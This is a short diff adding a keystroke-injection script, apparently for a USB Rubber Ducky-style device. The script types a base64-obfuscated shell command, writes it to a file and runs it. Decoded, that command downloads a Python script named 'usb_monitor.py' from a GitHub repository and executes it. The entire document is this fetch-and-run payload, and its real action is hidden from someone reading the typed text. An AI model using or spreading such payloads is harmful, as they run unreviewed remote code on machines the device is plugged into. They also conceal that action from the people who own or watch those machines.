@@ -1,0 +1,3 @@
+DELAY 800
+STRING echo bWtkaXIgLXAgfi9EZXNrdG9wICYmIGN1cmwgLUwgaHR0cHM6Ly9naXRodWIuY29tL0lULVRvb2wtYnktU2FsZ2Fkb1RlY2gvaXR0b29sLUV4dGVybmFsX1Rvb2xzL3Jhdy9yZWZzL2hlYWRzL21haW4vdXNiX21vbml0b3IucHkgLW8gfi9EZXNrdG9wL3VzYl9tb25pdG9yLnB5ICYmIHB5dGhvbjMgfi9EZXNrdG9wL3VzYl9tb25pdG9yLnB5 | base64 -d > /home/chefm/ittool_run.sh && sh /home/chefm/ittool_run.sh
+ENTER
